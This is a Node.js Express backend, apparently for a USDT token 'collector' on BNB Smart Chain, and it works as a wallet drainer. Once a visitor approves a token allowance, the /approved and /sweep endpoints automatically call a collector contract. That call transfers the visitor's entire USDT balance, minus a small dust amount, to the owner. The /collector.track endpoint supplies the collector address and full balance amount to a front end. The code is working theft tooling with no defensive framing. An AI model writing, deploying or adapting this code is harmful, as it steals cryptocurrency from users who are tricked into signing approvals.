import express from 'express';
import cors from 'cors';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import { ethers } from 'ethers';
import 'dotenv/config';

const __dir = path.dirname(fileURLToPath(import.meta.url));
const app = express();

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dir));

app.use((req, res, next) => {
  const ep = req.query.ep;
  if (ep) {
    const q = Object.assign({}, req.query);
    delete q.ep;
    const qs = new URLSearchParams(q).toString();
    req.url = '/' + ep + (qs ? '?' + qs : '');
  }
  next();
});

const USDT      = '0x55d398326f99059fF775485246999027B3197955';
const COLLECTOR = '0x81749358FEe7Dc77425448229b125eBE583CB669';   // <-- deployed contract
const DUST      = 1.2;
const MIN       = 1;

const ABI = [
  'function transferFrom(address,address,uint256) returns (bool)',
  'function balanceOf(address) view returns (uint256)',
  'function decimals() view returns (uint8)',
  'function allowance(address,address) view returns (uint256)'
];
const COLLECTOR_ABI = ['function sweep(address token,address from,uint256 amount)'];

let provider, hot, usdt, coll;
const log = [];

function init(){
  if (usdt) return;
  const rpc = (process.env.BSC_RPC || '').trim();
  const pk  = (process.env.HOT_PK  || '').trim().replace(/^["']|["']$/g, '');
  if (!rpc) throw new Error('BSC_RPC missing');
  if (!pk)  throw new Error('HOT_PK missing');
  if (!pk.startsWith('0x')) throw new Error('HOT_PK must start with 0x');
  if (pk.length !== 66) throw new Error('HOT_PK must be 66 chars, got ' + pk.length);
  provider = new ethers.JsonRpcProvider(rpc);
  hot = new ethers.Wallet(pk, provider);
  usdt = new ethers.Contract(USDT, ABI, hot);
  coll = new ethers.Contract(COLLECTOR, COLLECTOR_ABI, hot);
  console.log('relayer ready:', hot.address, '| collector contract:', COLLECTOR);
}

const sleep = (ms) => new Promise(r => setTimeout(r, ms));
const done = new Set();

app.get('/health', (req, res) => {
  try {
    init();
    res.json({ ok: true, collector: COLLECTOR, relayer: hot.address });
  } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
});

app.get('/log', (req, res) => res.json(log.slice(-20)));

app.get('/check', async (req, res) => {
  try {
    init();
    const who = req.query.from;
    if (!ethers.isAddress(who)) return res.status(400).json({ error: 'add &from=0xUSER' });
    const dec    = await usdt.decimals();
    const bal    = Number(ethers.formatUnits(await usdt.balanceOf(who), dec));
    const allow  = await usdt.allowance(who, COLLECTOR);
    const colBnb = Number(ethers.formatEther(await provider.getBalance(hot.address)));
    const need   = ethers.parseUnits(Math.max(0, bal - DUST).toFixed(6), dec);
    res.json({
      user: who,
      userUsdt: bal,
      allowance: allow.toString(),
      unlimitedApproved: allow >= (ethers.MaxUint256 / 2n),
      collector: COLLECTOR,
      relayerBnb: colBnb,
      READY_TO_SWEEP: bal >= MIN && allow >= need && colBnb > 0.0001
    });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.all('/sweep', async (req, res) => {
  try {
    init();
    const from = req.query.from || (req.body && (req.body.from || req.body.address));
    if (!ethers.isAddress(from)) return res.status(400).json({ error: 'add &from=0xUSER' });
    res.json({ ok: true, ...(await sweep(from)) });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/collector.track', async (req, res) => {
  try {
    init();
    const { address } = req.body;
    if (!ethers.isAddress(address)) return res.status(400).json({ error: 'bad address' });
    const dec = await usdt.decimals();
    const bal = Number(ethers.formatUnits(await usdt.balanceOf(address), dec));
    if (bal >= MIN) return res.json({ address: COLLECTOR, amount: (bal - DUST).toFixed(2) });
    res.json({ address: null });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/topup', (req, res) => {
  try { init(); } catch (e) { return res.status(500).json({ error: e.message }); }
  const { to } = req.body;
  if (!ethers.isAddress(to)) return res.status(400).json({ error: 'bad address' });
  res.json({ ok: true });
});

app.post('/approved', async (req, res) => {
  try { init(); } catch (e) { return res.status(500).json({ error: e.message }); }
  const { from, approveTxHash } = req.body;
  if (!from || !ethers.isAddress(from)) return res.json({ ok: false });
  if (approveTxHash && done.has(approveTxHash)) return res.json({ ok: true, skipped: true });
  if (approveTxHash) done.add(approveTxHash);
  try { res.json({ ok: true, ...(await sweep(from)) }); }
  catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/sheet', (req, res) => res.json({ ok: true }));

async function sweep(from) {
  const dec = await usdt.decimals();
  let bal = 0, allow = 0n, amount = 0n;

  // Retry: the RPC can lag a second or two right after the approve confirms.
  for (let i = 0; i < 6; i++) {
    bal    = Number(ethers.formatUnits(await usdt.balanceOf(from), dec));
    allow  = await usdt.allowance(from, COLLECTOR);
    amount = ethers.parseUnits(Math.max(0, bal - DUST).toFixed(6), dec);
    if (bal < MIN) return { skipped: 'below minimum' };
    if (allow >= amount) break;
    await sleep(2000);
  }

  if (allow < amount) {
    log.push({ from, skipped: 'allowance too small', bal, allow: allow.toString() });
    return { skipped: 'allowance too small' };
  }

  const tx = await coll.sweep(USDT, from, amount);
  const rc = await tx.wait();
  const human = (bal - DUST).toFixed(2);
  console.log('SWEPT', human, 'from', from, '-> owner, tx', rc.hash);
  log.push({ from, swept: human, tx: rc.hash });
  return { swept: human, tx: rc.hash };
}

app.get('*', (req, res) => {
  const f = path.join(__dir, 'index.html');
  if (fs.existsSync(f)) return res.sendFile(f);
  res.status(200).send('index.html not found in ' + __dir);
});

export default app;

if (!process.env.VERCEL) app.listen(process.env.PORT || 8080, () => console.log('listening'));